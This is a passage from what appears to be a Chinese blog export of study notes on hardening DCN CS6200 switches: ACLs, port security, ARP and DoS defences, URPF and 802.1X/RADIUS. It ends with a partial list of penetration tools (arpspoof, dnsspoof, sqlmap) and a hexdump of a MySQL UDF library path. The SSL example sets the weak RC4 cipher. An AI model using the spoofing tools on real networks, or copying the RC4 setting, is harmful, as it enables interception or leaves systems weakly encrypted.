class="literal">-id</span>&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>指定vlan与MAC的对应关系</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mac<span class="literal">-vlan</span> mac &lt;mac<span class="literal">-addrss</span>&gt; &lt;mac<span class="literal">-mask</span>&gt; vlan &lt;vlan<span class="literal">-id</span>&gt; priority &lt;priority<span class="literal">-id</span>&gt;</span><br></pre></td></tr></table></figure><ul><li>mac-mask建议为<code>ff:ff:ff:ff:ff:ff</code></li></ul><h2 id="基于IP"><a href="#基于IP" class="headerlink" title="基于IP"></a>基于IP</h2><ol><li>打开端口的基于IP功能, hybrid</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport subnet-vlan enable</span></span><br><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#swportport mode hybrid</span></span><br><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#swportport hybrid allowed vlan vlan_id &lt;untag|tag&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>动态的vlan一定要在端口模式下进行<code>hybrid allowed</code></p></blockquote><ol start="2"><li>设置IP子网与 VLAN 的对应关系</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subnet<span class="literal">-vlan</span> ip<span class="literal">-address</span> &lt;ipv4<span class="literal">-addrss</span>&gt; mask &lt;subnet<span class="literal">-mask</span>&gt; vlan &lt;vlan<span class="literal">-id</span>&gt; priority &lt;priority<span class="literal">-id</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="调整优先级"><a href="#调整优先级" class="headerlink" title="调整优先级"></a>调整优先级</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dynamic<span class="literal">-vlan</span> mac<span class="literal">-vlan</span> prefer</span><br><span class="line">dynamic<span class="literal">-vlan</span> subnet<span class="literal">-vlan</span> prefer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/Security.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/Security.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>  交换机端口安全和ARP, ACL, URPF, DOS等配置</p></blockquote><span id="more"></span><h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><blockquote><p>建议使用命名ACL</p></blockquote><p>神州交换机的ACL设置语句语法与CISCO <a href="../Networking/Cisco/ACL.md">ACL.md</a> 的基本一样, 使用有以下区别</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果要启用ACL, 必须使用以下指令</span></span><br><span class="line">Sw(config)<span class="comment">#firewall enable </span></span><br><span class="line"><span class="comment"># 可以将ACL应用于Telnet/ssh/web, test是我配置的命名ACL</span></span><br><span class="line">Sw(config)<span class="comment">#authentication ip access-class test in telnet </span></span><br><span class="line"><span class="comment"># access-group可以显示一条access-list与特定端口的绑定关系</span></span><br><span class="line">Sw(config)<span class="comment">#show access-group interface ethernet 1/0/1</span></span><br><span class="line">interface name:Ethernet1/<span class="number">0</span>/<span class="number">1</span></span><br><span class="line">    IP Ingress access<span class="literal">-list</span> used is test, traffic<span class="literal">-statistics</span> Disable.</span><br><span class="line">Sw(config)<span class="comment">#show access-lists </span></span><br><span class="line">ip access<span class="literal">-list</span> standard test(used <span class="number">1</span> time(s)) <span class="number">2</span> rule(s)</span><br><span class="line">   rule ID <span class="number">1</span>: deny <span class="number">192.168</span>.<span class="number">1.0</span> <span class="number">0.0</span>.<span class="number">0.255</span></span><br><span class="line">   rule ID <span class="number">3</span>: deny <span class="number">10.1</span>.<span class="number">128.0</span> <span class="number">0.0</span>.<span class="number">0.255</span></span><br><span class="line">   </span><br><span class="line">S3(config)<span class="comment">#access-list ?</span></span><br><span class="line">  &lt;<span class="number">1</span><span class="literal">-99</span>&gt;       IP 标准访问列表 &lt;<span class="number">1</span><span class="literal">-99</span>&gt;</span><br><span class="line">  &lt;<span class="number">100</span><span class="literal">-199</span>&gt;    扩展访问列表规则 &lt;<span class="number">100</span><span class="literal">-199</span>&gt;</span><br><span class="line">  &lt;<span class="number">1100</span><span class="literal">-1199</span>&gt;  MAC扩展访问列表规则 &lt;<span class="number">1100</span><span class="literal">-1199</span>&gt;</span><br><span class="line">  &lt;<span class="number">200</span><span class="literal">-299</span>&gt;    扩展访问列表规则(支持非连续IP地址掩码) &lt;<span class="number">200</span><span class="literal">-299</span>&gt;</span><br><span class="line">  &lt;<span class="number">3100</span><span class="literal">-3199</span>&gt;  MAC<span class="literal">-IP</span>扩展访问列表规则 &lt;<span class="number">3100</span><span class="literal">-3199</span>&gt;</span><br><span class="line">  &lt;<span class="number">3200</span><span class="literal">-3299</span>&gt;  MAC<span class="literal">-IP</span>扩展访问列表规则(支持非连续IP地址掩码) &lt;<span class="number">3200</span><span class="literal">-3299</span>&gt;</span><br><span class="line">  &lt;<span class="number">5000</span><span class="literal">-5099</span>&gt;  组播源控制访问列表规则 &lt;<span class="number">5000</span><span class="literal">-5099</span>&gt;</span><br><span class="line">  &lt;<span class="number">6000</span><span class="literal">-7999</span>&gt;  组播目的控制访问列表规则 &lt;<span class="number">6000</span><span class="literal">-7999</span>&gt;</span><br><span class="line">  &lt;<span class="number">700</span><span class="literal">-799</span>&gt;    MAC标准访问列表规则 &lt;<span class="number">700</span><span class="literal">-799</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="端口绑定MAC"><a href="#端口绑定MAC" class="headerlink" title="端口绑定MAC"></a>端口绑定MAC</h2><blockquote><p>绑定后如果连接的不是绑定的MAC, 或者数量超出限制, 都会触发交换机的保护机制</p><p>可以有效的防止MAC泛洪</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Sw(config)<span class="comment">#interface ethernet 1/0/1</span></span><br><span class="line">Sw(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport port-security</span></span><br><span class="line"><span class="comment"># 静态绑定</span></span><br><span class="line">Sw(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport port-security 00:90:9e:9a:a0:60</span></span><br><span class="line"><span class="comment"># 可设置MAC数量</span></span><br><span class="line">switchport port<span class="literal">-security</span> max &lt;cnt&gt;</span><br><span class="line"><span class="comment"># 动态学习</span></span><br><span class="line">Sw(config)<span class="comment">#mac-address-learning cpu-control </span></span><br><span class="line">Sw(config)<span class="comment">#show port-security address      </span></span><br><span class="line"></span><br><span class="line">Secure Mac Address Table                          </span><br><span class="line">-------------------------------------------------------------------------------------  </span><br><span class="line">Vlan                Mac Address                             <span class="built_in">Type</span>                Ports               </span><br><span class="line"><span class="number">1</span>                   <span class="number">00</span><span class="literal">-90</span><span class="literal">-9e</span><span class="literal">-9a</span><span class="literal">-a0</span><span class="literal">-60</span>                       SECURED             Ethernet1/<span class="number">0</span>/<span class="number">1</span>       </span><br><span class="line">Total Addresses:<span class="number">1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>端口模式下</th><th>作用</th></tr></thead><tbody><tr><td>`switchport port-security violation {protect</td><td>recovery</td></tr><tr><td>`clear port-security {all</td><td>configured</td></tr></tbody></table><h2 id="端口的IP和MAC-IP绑定-AM"><a href="#端口的IP和MAC-IP绑定-AM" class="headerlink" title="端口的IP和MAC-IP绑定[AM]"></a>端口的IP和MAC-IP绑定[AM]</h2><p>AM(<em>Access Management</em>)可以配置只转发某IP或者MAC-IP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sw(config)<span class="comment">#am enable               </span></span><br><span class="line">Sw(config)<span class="comment">#interface ethernet 1/0/1 </span></span><br><span class="line"><span class="comment"># 端口启用AM, 默认禁止所有的IP报文与ARP报文转发</span></span><br><span class="line">Sw(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#am port </span></span><br><span class="line"><span class="comment"># ip, 最后一个参数可以理解为192.168.1.1-10, 是一个范围值</span></span><br><span class="line">Sw(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#am ip-pool 192.168.1.1 10</span></span><br><span class="line"><span class="comment"># MAC-IP</span></span><br><span class="line">Sw(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#am mac-ip-pool 00:90:9e:9a:a0:60 10.1.128.24</span></span><br><span class="line">Sw(config)<span class="comment"># show am interface ethernet 1/0/1</span></span><br><span class="line">AM is enabled</span><br><span class="line">Interface Ethernet1/<span class="number">0</span>/<span class="number">1</span></span><br><span class="line">    am port</span><br><span class="line">    am mac<span class="literal">-ip</span><span class="literal">-pool</span>  <span class="number">00</span><span class="literal">-90</span><span class="literal">-9e</span><span class="literal">-9a</span><span class="literal">-a0</span><span class="literal">-60</span> <span class="number">10.1</span>.<span class="number">128.24</span></span><br></pre></td></tr></table></figure><h2 id="URPF-三层"><a href="#URPF-三层" class="headerlink" title="URPF[三层]"></a>URPF[三层]</h2><blockquote><p>通常情况下，网络中的路由器接收到报文后，获取报文的目的地址，针对目的地址查找路由，如果查找到则进行正常的转发，否则丢弃该报文。由此得知，路由器转发报文时，并不关心数据包的源地址，这就给源地址欺骗攻击有了可乘之机。</p><p>源地址欺骗攻击就是入侵者通过构造一系列带有伪造源地址的报文，频繁访问目的地址所在设备或者主机，即使受害主机或网络的回应报文不能返回到入侵者，也会对被攻击对象造成一定程度的破坏。</p><p><strong>URPF(<em>Unicast Reverse Path Forwarding</em>)</strong>通过检查数据包中源IP地址，并根据接收到数据包的接口和路由表中是否存在源地址路由信息条目，来确定流量是否真实有效，并选择数据包是转发或丢弃。</p></blockquote><table><thead><tr><th>全局配置模式</th><th>作用</th></tr></thead><tbody><tr><td><code>urpf enable</code></td><td>全局启动URPF</td></tr><tr><td>端口配置模式</td><td>作用</td></tr><tr><td>`ip urpf enable {loose</td><td>strict}`</td></tr></tbody></table><ul><li><strong>strict:</strong> 不但要求路由器转发表中，存在去往报文源地址的路由；而且还要求报文的入接口与转发表中去往源地址路由的出接口一致</li><li><strong>loose:</strong> 仅要求路由器的转发表中，存在去往报文的源地址路由即可</li></ul><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><table><thead><tr><th>全局</th><th>作用</th></tr></thead><tbody><tr><td><code>arp timeout</code></td><td>arp表项老化时间(s)</td></tr></tbody></table><table><thead><tr><th>vlan接口下</th><th>作用</th></tr></thead><tbody><tr><td><code>arp &lt;ip_address&gt; &lt;mac_address&gt; &#123;interface [ethernet] &lt;portName&gt; &#125;</code></td><td>指定静态arp</td></tr></tbody></table><blockquote><p>静态arp只能在vlan下且参数必须有物理接口才能添加成功</p></blockquote><h2 id="防ARP扫描攻击"><a href="#防ARP扫描攻击" class="headerlink" title="防ARP扫描攻击"></a>防ARP扫描攻击</h2><blockquote><p>ARP攻击会在局域网内大量的广播ARP报文, 消耗网络带宽</p><p>ARP也能也能进行其他攻击, 比如<a href="https://www.freebuf.com/articles/system/5157.html">中间人攻击-ARP毒化</a></p><p>这些攻击极度的威胁着网络的安全</p></blockquote><p>防止ARP扫描攻击有两种方式</p><ol><li><p><strong>基于端口</strong></p><p>如果某个端口的ARP报文超过一定阈值, 则down该端口</p></li><li><p><strong>基于IP</strong></p><p>记录某个IP的报文, 可以设置限速和隔离两个阈值, 超过隔离阈值则禁止来自此IP的任何流量</p></li></ol><p><em>两者可同时存在</em></p><h3 id="基于端口和基于IP的配置"><a href="#基于端口和基于IP的配置" class="headerlink" title="基于端口和基于IP的配置"></a>基于端口和基于IP的配置</h3><ol><li>开启ARP扫描功能</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anti<span class="literal">-arpscan</span> enable [<span class="type">ip</span>|<span class="type">port</span>]</span><br></pre></td></tr></table></figure><ol start="2"><li>设置基于端口阈值(包/s)</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anti<span class="literal">-arpscan</span> port<span class="literal">-based</span> threshold &lt;threshold<span class="literal">-value</span>&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>基于IP的阈值配置, 二级阈值必须&gt;一级阈值</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anti<span class="literal">-arpscan</span> ip<span class="literal">-based</span> level1|level2 threshold &lt;threshold<span class="literal">-value</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意: CS6200-28X-EI SoftWare Package Version 7.5.3.2(R0004.0030)不支持一二级阈值, 超过设置阈值则禁止来自此IP的任何流量</p></blockquote><h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><table><thead><tr><th>全局</th><th>作用</th></tr></thead><tbody><tr><td><code>anti-arpscan trust ip &lt;ip-address&gt; [&lt;netmask&gt;]</code></td><td>配置信任IP</td></tr><tr><td><code>anti-arpscan recovery enable</code></td><td>启用自动恢复功能</td></tr><tr><td><code>anti-arpscan recovery time &lt;seconds&gt;</code></td><td>恢复秒数</td></tr><tr><td><code>anti-arpscan log enable</code></td><td>打开日志</td></tr></tbody></table><p>配置信任端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口模式下</span></span><br><span class="line">anti<span class="literal">-arpscan</span> trust &lt;port | supertrust<span class="literal">-port</span>| iptrust<span class="literal">-port</span> &gt;</span><br></pre></td></tr></table></figure><h2 id="ARP绑定"><a href="#ARP绑定" class="headerlink" title="ARP绑定"></a>ARP绑定</h2><blockquote><p>在IPv4里, 为了防止ARP中间人攻击, ARP绑定也是一种防御手段</p><p>IPv6使用的是ND协议, 这是一个类ARP的协议, ND绑定命令同ARP</p></blockquote><p>ARP绑定有两种方法</p><h3 id="关闭交换机ARP更新"><a href="#关闭交换机ARP更新" class="headerlink" title="关闭交换机ARP更新"></a>关闭交换机ARP更新</h3><p>即交换机的MAC-PORT表存在后就不允许再改变</p><p>指令[全局配置]: <code>ip arp-security updateprotect</code></p><h3 id="关闭自动学习功能"><a href="#关闭自动学习功能" class="headerlink" title="关闭自动学习功能"></a>关闭自动学习功能</h3><p>只能设置静态ARP, 如果先前有动态也可以手动转化为静态</p><p>指令[全局配置]: <code>ip arp-security learnprotect</code></p><p>动态转为静态[全局配置]: <code>ip arp-security convert</code></p><h2 id="ARP-guard"><a href="#ARP-guard" class="headerlink" title="ARP guard"></a>ARP guard</h2><blockquote><p>对于ARP中间人攻击, arp guard则采用了保护ip的方法, 如果arp报文的源IP与保护IP一致则丢弃该报文, 通常用来保护网关, 不应该用来保护大量的IP地址, 会影响性能</p></blockquote><p>指令[全局]: <code>arp-guard ip &lt;addr&gt;</code></p><h2 id="端口-amp-vlan的MAC和IP数量限制"><a href="#端口-amp-vlan的MAC和IP数量限制" class="headerlink" title="端口&amp;vlan的MAC和IP数量限制"></a>端口&amp;vlan的MAC和IP数量限制</h2><p>交换机默认对MAC和IP表项的数量都没有限制, 直到将硬件填满为止.</p><p>这样在遭受DOS攻击时(如ARP, MAC欺骗), 很容易将表项填满, 进行数量限制可以预防DOS攻击</p><p>对于动态学习的现存表项, 都满足大于限制数量则停止学习, 小于则可以继续学习的原则</p><h3 id="端口限制"><a href="#端口限制" class="headerlink" title="端口限制"></a>端口限制</h3><table><thead><tr><th>端口模式</th><th>作用</th></tr></thead><tbody><tr><td><code>switchport mac-address dynamic maximum &lt;value&gt;</code></td><td>启用限制MAC功能</td></tr><tr><td>`switchport &lt;arp</td><td>nd&gt; dynamic maximum <value>`</td></tr><tr><td>`switchport mac-address violation {protect</td><td>shutdown} [recovery &lt;5-3600&gt;]`</td></tr></tbody></table><h3 id="VLAN限制"><a href="#VLAN限制" class="headerlink" title="VLAN限制"></a>VLAN限制</h3><table><thead><tr><th><code>vlan vlan_id</code>模式</th><th>作用</th></tr></thead><tbody><tr><td><code>vlan mac-address dynamic maximum &lt;value&gt;</code></td><td>开启限制MAC功能</td></tr></tbody></table><table><thead><tr><th>vlan接口模式</th><th>作用</th></tr></thead><tbody><tr><td>`ip[v6] &lt;arp</td><td>nd&gt; dynamic maximum <value>`</td></tr></tbody></table><h2 id="Gratuitous-免费-ARP"><a href="#Gratuitous-免费-ARP" class="headerlink" title="Gratuitous(免费) ARP"></a>Gratuitous(免费) ARP</h2><p>也是一种可以防止ARP欺骗的方法, <strong>交换机主动通过向局域网广播ARP报文</strong></p><ul><li>减少ARP请求次数</li><li>防止ARP欺骗网关</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>指令[全局/接口]: <code>ip gratuitous-arp &lt;5-1200s&gt;</code></p><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用服务</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#ip http secure-server</span></span><br><span class="line"><span class="comment"># 绑定端口</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#ip http secure-port 1025</span></span><br><span class="line"><span class="comment"># 加密套件</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#ip http secure-ciphersuite rc4-128-sha</span></span><br></pre></td></tr></table></figure><h2 id="防DOS攻击"><a href="#防DOS攻击" class="headerlink" title="防DOS攻击"></a>防DOS攻击</h2><blockquote><p>DoS 是 <em>Denial of Service</em> 的缩写,意为拒绝服务。DoS 攻击是网络上一种简单但很有效的破坏性攻击手段,服务器会由于不停顿地处理攻击者的数据包,从而正常用户发送的数据包会被丢弃,得不到处理,从而造成了服务器的拒绝服务,更严重的会导致服务器敏感数据泄漏。</p></blockquote><h3 id="IP-Spoofing"><a href="#IP-Spoofing" class="headerlink" title="IP Spoofing"></a>IP Spoofing</h3><p>IP欺骗简述: hacker发送修改过源IP数据包给服务器, 服务器错误的将数据回复给修改过的IP客户端, 利用该原理可义进行DOS和DDOS攻击, 并且有一定<strong>隐匿性</strong></p><p>解决方案: 在网络边缘设备检查源IP与其来源是否匹配</p><p>指令[全局]: <code>dosattack-check srcip-equal-dstip</code></p><h3 id="TCP非法标志攻击"><a href="#TCP非法标志攻击" class="headerlink" title="TCP非法标志攻击"></a>TCP非法标志攻击</h3><p>简述:   hacker利用TCP报文的6个标志位进行攻击, 如SYN泛洪, ACK和FIN/RST泛洪等</p><p>指令[全局]: <code>dosattack-check tcp-flags enable</code></p><h3 id="ICMP碎片攻击"><a href="#ICMP碎片攻击" class="headerlink" title="ICMP碎片攻击"></a>ICMP碎片攻击</h3><p>简述: IP支持2^16字节, MTU一般都是1500字节, hacker发送&gt;2^16字节的数据包, 导致系统出错</p><p><strong>指令[全局]</strong></p><p>icmp不可分片:  <code>dosattack-check icmp-attacking</code></p><p>设置icmp数据包长度: <code>dosattack-check icmpV4-size 100</code></p><h2 id="VLAN-hopping"><a href="#VLAN-hopping" class="headerlink" title="VLAN hopping"></a>VLAN hopping</h2><p>原理简述: 交换机开启了DTP(动态中继协议)后, hacker如果和交换机间建立了一条中继链路, 然后就能获取该<strong>交换机所有VLAN中的信息</strong>.</p><p>解决方法: 关闭DTP, 手动中继</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.cloudflare.com/zh-cn/learning/ddos/glossary/ip-spoofing/">什么是 IP 欺骗？</a></p><p><a href="https://cshihong.github.io/2019/05/14/%E7%BD%91%E7%BB%9C%E5%B1%82-TCP-UDP-%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%8E%9F%E7%90%86/">网络层-TCP-UDP-攻击与防御原理</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机认证配置</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/Authentication.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/Authentication.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 关于802.1x, radius, aaa等</p></blockquote><span id="more"></span><h2 id="802-1X"><a href="#802-1X" class="headerlink" title="802.1X"></a>802.1X</h2><blockquote><p>802.1X是IEEE LAN/WAN 委员会为了解决<strong>基于端口的网络接入控制</strong>（<em>Port-Based Network Access Control</em>）而定义的一个标准，该标准目前已经在无线局域网和以太网中被广泛应用。</p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>802.1X验证涉及到三个部分</p><ul><li>申请者: 客户端设备</li><li>验证者: 网络设备, 如交换机或者无线接入点</li><li>验证服务器: 支持<a href="https://zh.wikipedia.org/wiki/RADIUS">RADIUS</a>和<a href="https://zh.wikipedia.org/wiki/EAP">EAP(Extensible Authentication Protocol)</a>的主机</li></ul><p>申请者向验证者提供凭据，如用户名/密码或者数字证书，验证者将凭据转发给验证服务器来进行验证．</p><p>如果验证服务器认为凭据有效，则申请者（客户端设备）就被允许访问被保护侧网络的资源</p><blockquote><p>在验证者PAE(端口访问实体)与RADIUS服务器之间，可以使用两种<strong>认证方式</strong>来交换信息。一种是EAP协议报文使用EAPOR（EAP over RADIUS）封装格式承载于RADIUS协议中；另一种是EAP协议报文由接入控制单元PAE进行终结，采用包含PAP（Password Authentication Protocol，密码验证协议）或CHAP（Challenge Handshake Authentication Protocol，质询握手验证协议）属性的报文与RADIUS服务器进行认证交互</p></blockquote><h3 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h3><blockquote><p>认证过程可以由客户端主动发起，也可以由设备端发起。一方面当设备端探测到有未经过认证的用户使用网络时，就会主动向客户端发送EAP-Request/Identity 报文，发起认证；另一方面客户端可以通过客户端软件向设备端发送EAPOL-Start 报文，发起认证。</p></blockquote><p>802.1x系统支持<em>EAP 中继方式</em>和<em>EAP 终结方式</em>与远端RADIUS 服务器交互完成认证</p><p>EAP终结方式与EAP中继方式的认证流程相比，不同之处在于用来对用户密码信息进行加密处理的随机加密字由设备端生成，之后接入控制单元会把用户名、随机加密字和客户端加密后的密码信息一起送给RADIUS 服务器，进行相关的认证处理</p><p>下面是对中继和终结方式扩展出的三种优化认证模式</p><p><strong>基于端口</strong></p><p><strong>基于MAC</strong></p><p><strong>基于用户(IP+mac+端口, 可防止ARP欺骗)</strong></p><blockquote><p>交换机最大认证用户数：user-based用户数为ipv4支持700，ipv6支持1400；mac-based和交换机的限速值相关，最大可以达到4000人，推荐使用认证用户数不超过2000人</p></blockquote><h3 id="常用配置"><a href="#常用配置" class="headerlink" title="常用配置"></a>常用配置</h3><table><thead><tr><th>全局配置模式</th><th>作用</th></tr></thead><tbody><tr><td><code>dot1x enable</code></td><td>打开全局dot1X</td></tr><tr><td><code>dot1x user free-resource &lt;ip&gt;</code></td><td>未认证能访问的有限资源</td></tr></tbody></table><table><thead><tr><th>端口模式</th><th>作用</th></tr></thead><tbody><tr><td><code>dot1x guest-vlan &lt;vlanID&gt;</code></td><td>设置guest vlan</td></tr><tr><td>`dot1x port-method {macbased</td><td>portbased</td></tr><tr><td>`dot1x port-control {auto</td><td>force-authorized</td></tr></tbody></table><h3 id="配置RADIUS服务器"><a href="#配置RADIUS服务器" class="headerlink" title="配置RADIUS服务器"></a>配置RADIUS服务器</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置认证服务器</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#radius-server authentication host 10.1.1.3</span></span><br><span class="line"><span class="comment"># 配置计费服务器</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#radius-server accounting host 10.1.1.3</span></span><br><span class="line"><span class="comment"># Configure authentication and encryption key</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#radius-server key &lt;0|7&gt; key</span></span><br><span class="line"><span class="comment"># 配置认证服务器需要</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#aaa enable</span></span><br><span class="line"><span class="comment"># 配置计费服务器需要</span></span><br><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#aaa-accounting enable </span></span><br></pre></td></tr></table></figure><h2 id="AAA与radius"><a href="#AAA与radius" class="headerlink" title="AAA与radius"></a>AAA与radius</h2><blockquote><p>AAA(<em>Authentication,Authorization and Accounting</em>认证、授权和计费), 它提供了网络安全管理的一致性框架,该框架通过认证、授权和计费三大功能满足了安全网络的访问控制需求: 哪些用户可以访问网络设备,访问用户拥有哪些访问权限以及用户使用网络资源的统计计费。</p></blockquote><p>RADIUS(<em>Remote Authentication Dial-In User Service</em> 远程认证拨号用户服务)是一种分布式的、客户端/服务器结构的信息交互协议。RADIUS客户端一般在网络设备上启用,与802.1x协议结合实现认证、授权和计费的所有主要功能,而RADIUS服务器负责维护用户认证、授权和计费信息数据库,通过RADIUS协议与客户端进行通信,完成用户认证和授权信息的下发以及计费信息的统计。RADIUS协议是实现AAA框架的一种协议。</p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具集合</title>
      <link href="/TechnicalExperience/Penetration/tools.html"/>
      <url>/TechnicalExperience/Penetration/tools.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 收集工具和整理用法</p></blockquote><span id="more"></span><h2 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h2><h2 id="dnsspoof"><a href="#dnsspoof" class="headerlink" title="dnsspoof"></a>dnsspoof</h2><h2 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a><a href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a></h2><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></h2><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></h2><h2 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ echo &#x27;/lib_mysqludf_sys_64.so&#x27;| hexdump -C</span><br><span class="line">00000000  2f 6c 69 62 5f 6d 79 73  71 6c 75 64 66 5f 73 79  |/lib_mysqludf_sy|</span><br><span class="line">00000010  73 5f 36 34 2e 73 6f 0a                           |s_64.so.|</span><br><span class="line">0000001</span><br></pre></td></tr></table></figure><h2 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h2><p><a 